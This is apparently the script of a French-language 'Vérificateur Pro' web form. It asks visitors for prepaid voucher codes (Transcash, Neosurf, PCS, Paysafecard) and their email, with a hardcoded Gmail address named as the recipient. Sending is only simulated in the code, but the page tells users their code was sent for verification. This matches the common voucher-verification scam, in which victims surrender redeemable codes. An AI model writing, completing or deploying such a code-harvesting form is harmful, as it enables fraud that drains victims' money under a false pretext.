// Configuration - ton email est déjà configuré !
const CONFIG = {
    recipientEmail: 'liliopoppo3@gmail.com',
    
    cardPatterns: {
        transcash: /^[0-9]{10,12}$/,
        neosurf: /^[0-9]{10}$/,
        pcs: /^[0-9]{10,12}$/,
        paysafecard: /^[0-9]{16}$/,
        other: /^[A-Za-z0-9]{8,20}$/
    },
    
    messages: {
        invalidCode: 'Code invalide pour ce type de carte',
        required: 'Ce champ est requis',
        emailInvalid: 'Adresse email invalide',
        termsRequired: 'Vous devez accepter les conditions d\'utilisation',
        success: 'Code envoyé avec succès',
        error: 'Une erreur est survenue. Veuillez réessayer.'
    }
};

// Éléments DOM
const elements = {
    form: document.getElementById('verificationForm'),
    cardType: document.getElementById('cardType'),
    codeInput: document.getElementById('code'),
    emailInput: document.getElementById('email'),
    termsCheckbox: document.getElementById('terms'),
    submitBtn: document.getElementById('submitBtn')
};

// Initialisation
document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ Vérificateur Pro - Application initialisée');
    console.log('📧 Email destinataire:', CONFIG.recipientEmail);
    
    // Soumission du formulaire
    elements.form.addEventListener('submit', handleFormSubmit);
});

// Gestion de la soumission
async function handleFormSubmit(event) {
    event.preventDefault();
    
    if (!validateForm()) return;
    
    const formData = {
        cardType: elements.cardType.value,
        code: elements.codeInput.value.trim(),
        email: elements.emailInput.value.trim(),
        timestamp: new Date().toISOString()
    };
    
    // Simulation d'envoi d'email
    console.log('📧 Code à vérifier:', formData);
    alert('✅ Code envoyé avec succès à l\'email pour vérification !');
    
    // Réinitialise le formulaire
    elements.form.reset();
}

// Validation simple
function validateForm() {
    if (!elements.cardType.value) {
        alert('Veuillez sélectionner un type de carte');
        return false;
    }
    
    if (!elements.codeInput.value.trim()) {
        alert('Veuillez entrer un code');
        return false;
    }
    
    if (!elements.termsCheckbox.checked) {
        alert('Vous devez accepter les conditions');
        return false;
    }
    
    return true;
}
